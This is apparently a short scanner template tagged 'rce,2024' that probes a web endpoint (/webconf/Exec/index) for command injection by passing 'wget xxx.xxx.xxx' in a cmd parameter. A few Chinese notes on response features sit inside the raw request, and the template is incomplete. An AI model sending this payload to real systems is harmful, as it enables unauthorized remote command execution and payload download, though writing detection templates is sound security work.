  tags: rce,2024
http:
- raw:
  - 'GET /webconf/Exec/index?cmd=wget%20xxx.xxx.xxx HTTP/1.1


    Content-Type: application/x-www-form-urlencoded


    Accept-Encoding: gzip, deflate


    # 响应代码特征

    -1


    # 响应内容特征

    暂无


    # 上传文件定位

    暂无'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
